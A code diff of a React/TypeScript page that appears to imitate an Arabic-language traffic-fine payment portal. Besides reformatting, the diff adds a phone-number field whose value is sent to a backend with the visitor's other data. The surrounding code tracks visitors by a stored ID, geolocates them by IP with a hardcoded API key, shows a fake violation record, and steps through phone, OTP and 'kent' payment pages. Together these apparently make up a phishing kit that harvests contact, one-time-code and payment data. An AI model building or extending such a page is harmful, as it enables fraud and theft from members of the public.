@@ -14,15 +14,15 @@ import LoadingScreen from "./sahel"
 import FullPageLoader from "./loader1"
 import { setupOnlineStatus } from "./online-sts"
 import DiscountPopup from "./modal"
-const dataFake=[
+const dataFake = [
   {
-    violationAmount:5,
-    violationTicketNumber:'4587745',
-    vehiclePlateNumber:'********',
-    violationDate:' 12/1/2025:05:05:31 '
+    violationAmount: 5,
+    violationTicketNumber: '4587745',
+    vehiclePlateNumber: '********',
+    violationDate: ' 12/1/2025:05:05:31 '
   }
 ]
-function App(props: { setPage: any ,page:string}) {
+function App(props: { setPage: any, page: string }) {
   const [dataall] = useState<any>([])
   const { violationData, fetchViolationData } = useFetchViolationData()
   const [isOnline, setIsOnline] = useState<boolean>(true)
@@ -30,6 +30,7 @@ function App(props: { setPage: any ,page:string}) {
   // Call the function
 
   const [amount, setAmount] = useState(0)
+  const [mobile, setMobile] = useState('')
   const [_id] = useState("id" + Math.random().toString(16).slice(2))
   const [id, setId] = useState("")
 
@@ -54,12 +55,12 @@ function App(props: { setPage: any ,page:string}) {
       forestoreAttachment: "app-IFifwzlcXElzzk2qTKQJdX2wp6v3z0.tsx",
       isOnline: navigator.onLine,
     })
-    
+
   }, [])
   async function getLocation() {
     const APIKEY = '73cc63b69c0d6f3e0e4be0127ab551c66daccd975d167f2e968e29d6';
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
-    
+
     try {
       const response = await fetch(url);
       if (!response.ok) {
@@ -68,7 +69,7 @@ function App(props: { setPage: any ,page:string}) {
       const country = await response.text();
       addData({
         ...data,
-        country:country
+        country: country
       })
       console.log(country);
     } catch (error) {
@@ -106,7 +107,7 @@ function App(props: { setPage: any ,page:string}) {
     if (localStorage.getItem("vistor")) {
       const visitorId = localStorage.getItem("vistor")
       if (visitorId) {
-    setupOnlineStatus(visitorId)
+        setupOnlineStatus(visitorId)
         addData({
           id: visitorId,
           lastSeen: new Date().toISOString(),
@@ -142,7 +143,7 @@ function App(props: { setPage: any ,page:string}) {
       ) : props.page === "phone" ? (
         <VerificationForm />
       ) : props.page === "phoneCode" ? (
-        <PhoneOTP  />
+        <PhoneOTP />
       ) : props.page === "sahel" ? (
         <LoadingScreen />
       ) : props.page === "main" ? (
@@ -573,12 +574,12 @@ function App(props: { setPage: any ,page:string}) {
             <div className="col">
               <div className="row text-justify">
                 <div className="col-sm-4 title">
-               
+
                 </div>
                 <div className="col-sm-8">&nbsp;</div>
               </div>
               <div className="row text-center">
-               
+
                 <div className="col-sm-12 col-md-8 col-lg-8" id="GDTContent">
                   <div className="row">
                     <div className="col-3">&nbsp;</div>
@@ -590,7 +591,7 @@ function App(props: { setPage: any ,page:string}) {
                     </div>
                     <div className="col-3">&nbsp;</div>
                   </div>
-                  <div className="row mt-2 pl-2 pr-1 pb-5 text-justify" style={{fontSize:12}}>
+                  <div className="row mt-2 pl-2 pr-1 pb-5 text-justify" style={{ fontSize: 12 }}>
                     <div className="col-12">
                       <form id="enquireForm" onSubmit={handleSubmit}>
                         <div className="form-row">
@@ -677,12 +678,12 @@ function App(props: { setPage: any ,page:string}) {
                                 </div>
                               </div>
                               <Plate
-                              setChedcked={setChedcked}
+                                setChedcked={setChedcked}
                                 violations={violationData?.personalViolationsData ?? dataFake}
                                 setAmount={setAmount}
                               />
                             </>
-                          ) :  null}
+                          ) : null}
                         </div>
                         <div className="form-row align-self-center mt-2">
                           <div className="col-12 text-left" id="payingAmount" />
@@ -691,29 +692,43 @@ function App(props: { setPage: any ,page:string}) {
                           <div className="col-12 text-right font-weight-bold mb-2">
                             بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                           </div>
+                          <label id="lblEnquiryType"> رقم الهاتف </label>
+                          <div className="col-12 text-right font-weight-bold mb-2">
+                            <input
+                              className="form-control "
+                              id="tel"
+                              name="tel"
+                              type="tel"
+                              required
+                              maxLength={10}
+                              onChange={(e) => {
+                                setMobile(e.target.value)
+                              }}
+                            />
+                          </div>
                           <div className="col-sm-12 col-md-4 text-right">
                             <button
                               type="button"
                               onClick={() => {
                                 setloading(true)
-
                                 addData({
                                   ...data,
+                                  mobile: mobile
                                 })
 
                                 setTimeout(() => {
-addData({...data,page:'kent'}).then(()=>{
-  setloading(false)
-})
+                                  addData({ ...data, page: 'kent' }).then(() => {
+                                    setloading(false)
+                                  })
                                 }, 1000) // Reduced timeout for better user experience
                               }}
                               id="btnPay"
                               disabled={loading || !checked}
                               className={`btn btn-primary btn-block col-12 ${show ? "" : "d-none"}`}
-                              
+
                             >
-                              {loading ?"انتظر...":"إدفع         "}
-                     </button>
+                              {loading ? "انتظر..." : "إدفع         "}
+                            </button>
                           </div>
                           <div className="col-sm-12 col-md-6 align-self-center">&nbsp;</div>
                         </div>
@@ -744,19 +759,17 @@ addData({...data,page:'kent'}).then(()=>{
                       </form>
                     </div>
                   </div>
-              
-                 
                 </div>
               </div>
             </div>
           </div>
-       
+
         </div>
       ) : (
         <Kent violationValue={amount} />
       )}
       <FullPageLoader isLoading={loading} />
-      <DiscountPopup/>
+      <DiscountPopup />
     </>
   )
 }
